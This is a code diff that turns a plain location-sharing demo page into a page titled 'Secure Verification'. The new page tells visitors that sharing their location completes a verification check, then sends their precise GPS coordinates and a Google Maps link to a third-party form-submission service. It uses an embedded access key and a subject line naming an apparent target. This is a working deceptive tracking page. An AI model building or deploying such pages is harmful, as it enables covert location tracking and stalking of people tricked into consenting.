@@ -1,49 +1,102 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Share Location</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Verification</title>
+    <style>
+        body { font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f8f9fa; }
+        .card { background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 340px; }
+        h2 { color: #212529; font-size: 22px; margin-bottom: 10px; }
+        p { color: #6c757d; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
+        button { background-color: #007bff; color: white; border: none; padding: 14px; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; width: 100%; transition: 0.2s; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+        #status { margin-top: 20px; font-size: 14px; font-weight: 500; }
+        .success { color: #28a745; }
+        .error { color: #dc3545; }
+    </style>
 </head>
 <body>
-    <h2>Location Request</h2>
-    <p>Click the button below to share your current coordinates.</p>
-    
-    <button onclick="getLocation()">Share My Location</button>
 
-    <p id="display"></p>
+<div class="card">
+    <h2>Secure Check-In</h2>
+    <p>Please share your location to complete the verification process.</p>
+    <button id="shareBtn" onclick="getLocation()">Share Location</button>
+    <div id="status"></div>
+</div>
 
-    <script>
-        const output = document.getElementById("display");
+<script>
+    const statusDiv = document.getElementById("status");
+    const shareBtn = document.getElementById("shareBtn");
 
-        function getLocation() {
-            if (navigator.geolocation) {
-                // This triggers the browser permission popup
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
+    function getLocation() {
+        shareBtn.disabled = true;
+        shareBtn.innerText = "Processing...";
+        statusDiv.innerHTML = "Requesting GPS...";
+        statusDiv.className = "";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
+        } else {
+            statusDiv.innerHTML = "GPS not supported by your browser.";
+            resetBtn();
+        }
+    }
+
+    function sendPosition(position) {
+        statusDiv.innerHTML = "Sending secure data...";
+        
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        const payload = {
+            access_key: "83ad72c3-54bd-4f7f-9098-8c58e63b304d",
+            subject: "Location Received: Dhanajizole",
+            Latitude: lat,
+            Longitude: lon,
+            Map_Link: `https://www.google.com/maps?q=${lat},${lon}`,
+            Accuracy: position.coords.accuracy + " meters"
+        };
+
+        fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        })
+        .then(async (response) => {
+            if (response.status === 200) {
+                statusDiv.innerHTML = "✅ Verification Successful!";
+                statusDiv.className = "success";
+                shareBtn.innerText = "Verified";
             } else {
-                output.innerHTML = "Geolocation is not supported by this browser.";
+                statusDiv.innerHTML = "❌ Error sending data.";
+                resetBtn();
             }
-        }
+        })
+        .catch(error => {
+            statusDiv.innerHTML = "❌ Connection Error.";
+            resetBtn();
+        });
+    }
 
-        function showPosition(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            
-            output.innerHTML = "Latitude: " + lat + "<br>Longitude: " + lon;
-            
-            // In a real scenario, you would add code here to send 
-            // lat and lon to your email or a database.
-            console.log("Location captured:", lat, lon);
-        }
+    function resetBtn() {
+        shareBtn.disabled = false;
+        shareBtn.innerText = "Share Location";
+    }
 
-        function showError(error) {
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    output.innerHTML = "User denied the request for Geolocation."
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    output.innerHTML = "Location information is unavailable."
-                    break;
-            }
+    function showError(error) {
+        resetBtn();
+        if (error.code === 1) {
+            statusDiv.innerHTML = "Permission Denied. Please allow location.";
+        } else {
+            statusDiv.innerHTML = "Location error. Try again.";
         }
-    </script>
+        statusDiv.className = "error";
+    }
+</script>
+
 </body>
 </html>
